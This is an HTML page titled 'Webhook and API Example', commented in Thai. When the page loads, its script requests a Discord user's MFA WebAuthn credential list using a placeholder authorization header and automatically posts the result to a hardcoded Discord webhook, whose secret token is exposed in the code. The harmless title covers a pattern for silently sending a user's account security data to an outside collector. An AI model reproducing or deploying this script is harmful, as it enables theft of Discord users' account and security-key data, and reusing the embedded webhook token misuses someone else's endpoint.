<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webhook and API Example</title>
    <script>
        // URL ของ Discord Webhook
        const webhookUrl = 'https://discord.com/api/webhooks/1262428333061308486/rjzPQxwlyNV3-c4wP_RrSso80UdhwUuKFBJU9QYEnE-Hw3U-J2n5t2PBaIJNaYrvYc6K';

        // URL ของ API ที่ต้องการดึงข้อมูล
        const apiUrl = 'https://discord.com/api/v9/users/@me/mfa/webauthn/credentials';

        // ส่งข้อความไปยัง Discord Webhook
        function sendWebhookMessage(message) {
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: message,
                }),
            })
            .then(response => response.json())
            .then(data => console.log('Webhook response:', data))
            .catch(error => console.error('Error sending webhook:', error));
        }

        // ดึงข้อมูลจาก API และส่งไปยัง Webhook
        function fetchAndSendData() {
            fetch(apiUrl, {
                method: 'GET',
                headers: {
                    'Authorization': 'YOUR_DISCORD_AUTHORIZATION_HEADER',
                    'Content-Type': 'application/json',
                },
            })
            .then(response => response.json())
            .then(data => {
                console.log('Fetched data:', data);
                sendWebhookMessage('Data fetched: ' + JSON.stringify(data));
            })
            .catch(error => console.error('Error fetching data:', error));
        }

        // เมื่อโหลดหน้าเว็บทำการส่งข้อความและดึงข้อมูล
        window.onload = function() {
            sendWebhookMessage('เริ่มการทำงาน');
            fetchAndSendData();
        }
    </script>
</head>
<body>
    <h1>Webhook and API Example</h1>
</body>
</html>
